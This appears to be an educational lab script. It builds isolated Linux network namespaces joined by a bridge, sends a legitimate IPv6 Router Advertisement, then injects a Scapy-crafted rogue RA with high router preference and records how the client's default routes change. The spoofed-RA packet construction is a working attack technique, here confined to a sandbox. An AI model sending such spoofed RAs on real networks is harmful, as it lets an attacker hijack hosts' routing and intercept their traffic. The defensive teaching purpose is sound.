#!/usr/bin/env python3
"""Isolated RA priority demonstration. Requires sudo, iproute2, tcpdump, Scapy."""
import argparse
import subprocess
import sys
import time
from pathlib import Path

PREFIX = "l6spoof"
ROLES = {"router": ("rh", "r0"), "client": ("ch", "c0"), "sender": ("sh", "s0")}
BRIDGE = "l6spoofbr"


def cmd(*args, check=True, capture=False):
    return subprocess.run(args, check=check, text=True,
                          stdout=subprocess.PIPE if capture else None,
                          stderr=subprocess.STDOUT if capture else None)


def ip(*args, **kw):
    return cmd("ip", *args, **kw)


def cleanup():
    for role in ROLES:
        ip("netns", "del", f"{PREFIX}-{role}", check=False)
    ip("link", "del", BRIDGE, check=False)


def main():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--out", default=str(Path.home() / "lab06-ra-spoof"))
    p.add_argument("--cleanup", action="store_true")
    a = p.parse_args()
    if a.cleanup:
        cleanup()
        return
    if not (sys.platform.startswith("linux") and __import__("os").geteuid() == 0):
        raise SystemExit("Run from WSL/Linux with sudo.")
    try:
        import scapy.all as sc
    except ImportError:
        raise SystemExit("Install Scapy with: sudo apt install python3-scapy")
    cleanup()
    ip("link", "add", BRIDGE, "type", "bridge")
    ip("link", "set", BRIDGE, "up")
    for role in ROLES:
        ip("netns", "add", f"{PREFIX}-{role}")
        ip("-n", f"{PREFIX}-{role}", "link", "set", "lo", "up")
    for role, (host, inside) in ROLES.items():
        ip("link", "add", host, "type", "veth", "peer", "name", inside)
        ip("link", "set", inside, "netns", f"{PREFIX}-{role}")
        ip("link", "set", host, "master", BRIDGE)
        ip("link", "set", host, "up")
        ip("-n", f"{PREFIX}-{role}", "link", "set", inside, "up")
    ip("-n", f"{PREFIX}-router", "-6", "addr", "add", "2001:db8:6::1/64", "dev", "r0")
    ip("-n", f"{PREFIX}-router", "-6", "addr", "add", "fe80::1/64", "dev", "r0", "nodad")
    ip("-n", f"{PREFIX}-sender", "-6", "addr", "add", "fe80::dead:beef/64", "dev", "s0", "nodad")
    ip("netns", "exec", f"{PREFIX}-client", "sysctl", "-qw",
       "net.ipv6.conf.c0.accept_ra=1", "net.ipv6.conf.c0.autoconf=1")
    out = Path(a.out); out.mkdir(parents=True, exist_ok=True)
    capture = subprocess.Popen(["tcpdump", "-U", "-i", "ch", "-w",
                                str(out / "ra-spoof.pcap"), "icmp6"])
    time.sleep(1)
    legit = sc.Ether(src="02:00:00:00:06:01", dst="33:33:00:00:00:01") / sc.IPv6(
        src="fe80::1", dst="ff02::1", hlim=255) / sc.ICMPv6ND_RA(
        routerlifetime=1800, prf=0) / sc.ICMPv6NDOptPrefixInfo(
        prefix="2001:db8:6::", prefixlen=64, L=1, A=1,
        validlifetime=3600, preferredlifetime=1800)
    sc.sendp(legit, iface="rh", verbose=False)
    time.sleep(2)
    baseline = ip("netns", "exec", f"{PREFIX}-client", "ip", "-6", "route",
                  "show", "default", capture=True).stdout
    (out / "baseline-route.txt").write_text(baseline)
    print("Client route after legitimate router RA:")
    print(baseline or "(none observed)")
    fake = sc.Ether(src="02:aa:bb:cc:dd:ee", dst="33:33:00:00:00:01") / sc.IPv6(
        src="fe80::dead:beef", dst="ff02::1", hlim=255) / sc.ICMPv6ND_RA(
        routerlifetime=900, prf=1) / sc.ICMPv6NDOptPrefixInfo(
        prefix="2001:db8:6::", prefixlen=64, L=1, A=1,
        validlifetime=3600, preferredlifetime=1800)
    sc.sendp(fake, iface="sh", verbose=False)
    time.sleep(3)
    capture.terminate(); capture.wait()
    route = ip("netns", "exec", f"{PREFIX}-client", "ip", "-6", "route",
               "show", "default", capture=True).stdout
    (out / "client-default-routes.txt").write_text(route)
    print("Injected one crafted RA on the isolated bridge. Client default routes:")
    print(route or "(none observed)")
    print(f"PCAP: {out / 'ra-spoof.pcap'}")
    print("Cleanup: sudo python3 ra_spoof_lab.py --cleanup")


if __name__ == "__main__":
    main()
